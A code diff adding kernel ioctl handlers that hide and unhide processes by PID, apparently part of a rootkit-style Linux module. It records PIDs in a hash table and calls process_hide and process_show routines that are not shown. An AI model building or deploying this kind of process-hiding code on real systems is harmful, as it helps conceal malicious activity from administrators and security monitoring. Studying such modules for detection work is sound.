@@ -16,5 +16,55 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
+#include "logging.h"
+#include "ctrl/details/hash_tbl.h"
 #include "ctrl/details/ioctl_proc.h"
+#include "ctrl/details/pid_utils.h"
+
+int ioc_hide_proc(module_dev_t* p_dev, pid_t pid)
+{
+    int rc = 0;
+
+    if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
+        KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: invalid pid");
+        return -ESRCH;  /* No such process */
+    }
+
+    if (mutex_lock_interruptible(&p_dev->lock)) {
+        KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: failed to lock mutex");
+        return -ERESTARTSYS;
+    }
+    rc = hash_tbl_insert(&p_dev->hash_tbl, pid);
+    if (rc == 0) {
+        rc = process_hide(pid);
+        if (rc != 0) {
+            hash_tbl_erase(&p_dev->hash_tbl, pid);
+        }
+    }
+    mutex_unlock(&p_dev->lock);
+    KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: hid process result %d", rc);
+    return rc;
+}
+
+int ioc_show_proc(module_dev_t* p_dev, pid_t pid)
+{
+    int rc = 0;
+
+    if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
+        KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: invalid pid");
+        return -ESRCH;  /* No such process */
+    }
+
+    if (mutex_lock_interruptible(&p_dev->lock)) {
+        KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: failed to lock mutex");
+        return -ERESTARTSYS;
+    }
+    rc = hash_tbl_erase(&p_dev->hash_tbl, pid);
+    if (rc == 0) {
+        rc = process_show(pid);
+    }
+    mutex_unlock(&p_dev->lock);
+    KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: hid process result %d", rc);
+    return rc;
+}
 
